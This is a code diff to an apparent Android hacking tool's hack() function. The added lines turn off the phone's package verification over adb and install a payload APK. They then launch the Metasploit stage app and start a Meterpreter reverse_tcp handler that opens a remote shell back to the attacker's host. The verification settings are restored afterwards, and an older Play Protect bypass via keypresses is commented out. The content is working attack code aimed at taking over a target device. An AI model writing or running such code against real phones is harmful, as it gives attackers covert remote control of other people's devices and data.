@@ -458,22 +458,29 @@ def hack():
         print(f"\n{color.CYAN}Installing APK to target device...{color.WHITE}\n")
         os.system('adb shell input keyevent 3')  # Going on Home Screen
 
+        # Disabling App Verification
+        os.system('adb shell settings put global package_verifier_enable 0')
+        os.system('adb shell settings put global verifier_verify_adb_installs 0')
+
         # installing apk to device
         if operating_system == 'Windows':
             # (used 'start /b' to execute command in background)
-            os.system("start /b adb install -r test.apk")
+            # os.system("start /b adb install -r test.apk")
+            os.system("adb install -r test.apk")
         else:
             # (used ' &' to execute command in background)
-            os.system("adb install -r test.apk &")
-        time.sleep(5)  # waiting for apk to be installed
+            # os.system("adb install -r test.apk &")
+            os.system("adb install -r test.apk")
+        # time.sleep(5)  # waiting for apk to be installed
+
+        # Discarding these steps
+        # print(
+        #     f"\n{color.CYAN}Sending keycodes to Bypass Google Play Protect\n{color.WHITE}")
+        # os.system('adb shell input keyevent 20')
+        # os.system('adb shell input keyevent 20')
+        # os.system('adb shell input keyevent 66')
 
         # Keyboard input to accept app install
-        print(
-            f"\n{color.CYAN}Sending keycodes to Bypass Google Play Protect\n{color.WHITE}")
-        os.system('adb shell input keyevent 20')
-        os.system('adb shell input keyevent 20')
-        os.system('adb shell input keyevent 66')
-
         print(f"\n{color.CYAN}Launching app...\n{color.WHITE}")
         package_name = "com.metasploit.stage"  # payload package name
         os.system("adb shell monkey -p " + package_name + " 1")
@@ -491,6 +498,11 @@ def hack():
             f"\n{color.RED}Launching and Setting up Metasploit-Framework\n{color.WHITE}")
         os.system(
             f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT {lport} ; exploit'")
+
+        # Re-Enabling App Verification (Restoring Device to Previous State)
+        os.system('adb shell settings put global package_verifier_enable 1')
+        os.system('adb shell settings put global verifier_verify_adb_installs 1')
+
     else:
         print('\nGoing Back to Main Menu\n')
 
